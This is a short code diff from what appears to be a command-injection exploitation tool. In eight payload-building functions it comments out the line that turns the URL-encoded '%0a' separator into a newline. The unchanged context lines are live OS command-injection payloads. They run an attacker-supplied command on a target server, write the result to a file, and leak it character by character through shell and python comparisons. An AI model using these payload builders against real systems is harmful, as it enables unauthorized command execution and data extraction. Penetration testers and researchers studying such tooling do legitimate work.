@@ -64,7 +64,7 @@ def decision(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):
                 )
 
     elif separator == "%0a" :
-      separator = "\n"
+      #separator = "\n"
       payload = (separator +
                 "str=$(echo " + TAG + ">" + OUTPUT_TEXTFILE + ")" + separator +
                 "str=$(cat " + OUTPUT_TEXTFILE + ")" + separator +
@@ -146,7 +146,7 @@ def decision_alter_shell(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_reque
                 )
 
     elif separator == "%0a" :
-      separator = "\n"
+      #separator = "\n"
       payload = (separator +
                 "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('" + TAG + "')\nf.close()\n\")" + separator +
                 # Find the length of the output, using readline().
@@ -253,7 +253,7 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_meth
                 )
 
     elif separator == "%0a" :
-      separator = "\n"
+      #separator = "\n"
       payload = (separator +
                 "str=$(" + cmd + ">" + OUTPUT_TEXTFILE + separator + " tr '\\n' ' ' < " + OUTPUT_TEXTFILE + " )" + separator +
                 "echo $str > " + OUTPUT_TEXTFILE + separator +
@@ -349,7 +349,7 @@ def cmd_execution_alter_shell(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_
                 )
 
     elif separator == "%0a" :
-      separator = "\n"
+      #separator = "\n"
       payload = (separator +
                 "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('$(echo $(" + cmd + "))')\nf.close()\n\")" + separator +
                 # Find the length of the output, using readline().
@@ -429,7 +429,7 @@ def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http
                 )
 
     elif separator == "%0a" :
-      separator = "\n"
+      #separator = "\n"
       payload = (separator +
                 # Use space as delimiter
                 "str=$(cut -d ' ' -f " + str(num_of_chars) + " < " + OUTPUT_TEXTFILE +  ")" + separator +
@@ -504,7 +504,7 @@ def get_char_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, t
                 )
 
     elif separator == "%0a" :
-      separator = "\n"
+      #separator = "\n"
       payload = (separator +
                 "str=$(python -c \"with open('" +OUTPUT_TEXTFILE+ "') as file: print ord(file.readlines()[0][" +str(num_of_chars-1)+ "])\nexit(0)\")" + separator +
                 "if [ " + str(ascii_char) + " != ${str} ]" + separator +
@@ -579,7 +579,7 @@ def fp_result(separator, OUTPUT_TEXTFILE, ascii_char, timesec, http_request_meth
                 )
 
     elif separator == "%0a" :
-      separator = "\n"
+      #separator = "\n"
       payload = (separator +
                 "str=$(cut -c1-2 " + OUTPUT_TEXTFILE + ")" + separator +
                 "if [ " + str(ord(str(ascii_char))) + " != ${str} ]" + separator +
@@ -647,7 +647,7 @@ def fp_result_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, 
                 )
 
     elif separator == "%0a" :
-      separator = "\n"
+      #separator = "\n"
       payload = (separator +
                 "str=$(python -c \"with open('" +OUTPUT_TEXTFILE+ "') as file: print file.readlines()[0][" +str(num_of_chars-1)+ "]\nexit(0)\")" + separator +
                 "if [ " + str(ascii_char) + " != ${str} ]" + separator +
